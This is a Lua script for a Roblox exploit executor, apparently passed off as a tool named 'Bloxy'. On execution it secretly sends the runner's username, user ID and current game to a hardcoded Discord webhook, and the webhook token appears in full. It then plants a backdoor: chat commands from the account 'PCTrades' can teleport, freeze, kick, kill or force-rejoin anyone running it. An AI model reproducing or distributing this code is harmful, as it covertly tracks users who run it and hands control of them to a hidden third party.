local HttpRequest = syn and syn.request or http_request

local webhookUrl = "https://discordapp.com/api/webhooks/1338123313834102826/qdHEYQ-UoAeDRCeRfgbQonII3aqTUlB1OfuOfORI1cn_6kfj2rXCujXXU4-ML5Y7teDf"
local player = game.Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local gameId = game.PlaceId
local time = os.date("%m/%d/%Y %H:%M:%S")

local StarterGui = game:GetService("StarterGui")
StarterGui:SetCore("SendNotification", {
    Title = "Bloxy",
    Text = "Executing..",
    Duration = 5
})

local data = {
    embeds = {
        {
            title = "Bloxy",
            description = string.format("**Username**: %s\n**UserID**: %s\n**Time**: %s\n**CurrentGame**: [game](https://www.roblox.com/games/%s)", username, userId, time, gameId),
            color = 0x800080
        }
    }
}

local jsonData = game:GetService("HttpService"):JSONEncode(data)

HttpRequest({
    Url = webhookUrl,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = jsonData
})

local Players = game:GetService("Players")
local leaderUsername = "PCTrades"
local bringCommand = ".bring"
local kickCommand = ".kick"
local releaseCommand = ".release"
local resetCommand = ".reset"
local rejoinCommand = ".rejoin"
local ts = game:GetService("TeleportService")

local function hasScriptExecuted(player)
    return player:FindFirstChild("HasExecutedScript") ~= nil
end

local floatingPlayers = {}

local function catchAllPlayers()
    local leader = Players:FindFirstChild(leaderUsername)
    if leader and leader.Character and leader.Character:FindFirstChild("HumanoidRootPart") then
        local leaderPos = leader.Character.HumanoidRootPart.Position
        for _, player in ipairs(Players:GetPlayers()) do
            if hasScriptExecuted(player) and player.Name ~= leaderUsername and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = player.Character.HumanoidRootPart
                hrp.CFrame = CFrame.new(leaderPos + Vector3.new(0, 5, 0))
                local bodyPosition = Instance.new("BodyPosition")
                bodyPosition.MaxForce = Vector3.new(500000, 500000, 500000)
                bodyPosition.D = 50
                bodyPosition.P = 10000
                bodyPosition.Position = hrp.Position
                bodyPosition.Parent = hrp
                floatingPlayers[player] = bodyPosition
            end
        end
    end
end

local function kickAllPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        if hasScriptExecuted(player) and player.Name ~= leaderUsername then
            player:Kick("You have been kicked.")
        end
    end
end

local function resetAllPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        if hasScriptExecuted(player) and player.Name ~= leaderUsername then
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid.Health = 0
            end
        end
    end
end

local function rejoinAllPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        if hasScriptExecuted(player) and player.Name ~= leaderUsername then
            local success, errorMessage = pcall(function()
                ts:Teleport(game.PlaceId, player)
            end)
            if not success then
                warn("Failed to teleport player " .. player.Name .. ": " .. errorMessage)
            end
        end
    end
end

local function releasePlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        if hasScriptExecuted(player) and player.Name ~= leaderUsername and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart
            local bodyPosition = hrp:FindFirstChildOfClass("BodyPosition")
            if bodyPosition then
                bodyPosition:Destroy()
                floatingPlayers[player] = nil
            end
        end
    end
end

local function onPlayerChatted(player)
    player.Chatted:Connect(function(message)
        local lowerMessage = message:lower()
        if player.Name == leaderUsername then
            local success, errorMessage = pcall(function()
                if lowerMessage == bringCommand then
                    catchAllPlayers()
                elseif lowerMessage == kickCommand then
                    kickAllPlayers()
                elseif lowerMessage == releaseCommand then
                    releasePlayers()
                elseif lowerMessage == resetCommand then
                    resetAllPlayers()
                elseif lowerMessage == rejoinCommand then
                    rejoinAllPlayers()
                end
            end)
        end
    end)
end

local function onPlayerAdded(player)
    local tag = Instance.new("BoolValue")
    tag.Name = "HasExecutedScript"
    tag.Parent = player
    onPlayerChatted(player)
end

for _, player in ipairs(Players:GetPlayers()) do
    local tag = Instance.new("BoolValue")
    tag.Name = "HasExecutedScript"
    tag.Parent = player
    onPlayerChatted(player)
end

Players.PlayerAdded:Connect(onPlayerAdded)
